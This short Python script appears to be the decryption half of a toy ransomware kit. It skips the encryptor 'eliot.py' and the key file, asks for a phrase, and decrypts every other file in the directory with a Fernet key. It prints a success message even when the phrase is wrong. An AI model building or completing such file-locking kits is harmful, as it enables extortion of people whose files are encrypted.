
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "eliot.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

with open ("thekey.key", "rb") as key:
	secretkey = key.read()

secret_phrase = ""  #enter the password you want to set for your file here.

user_phrase = input("Enter the phrase to unlock your files: ")


if user_phrase == secret_phrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)

print("the files has been decrypted")




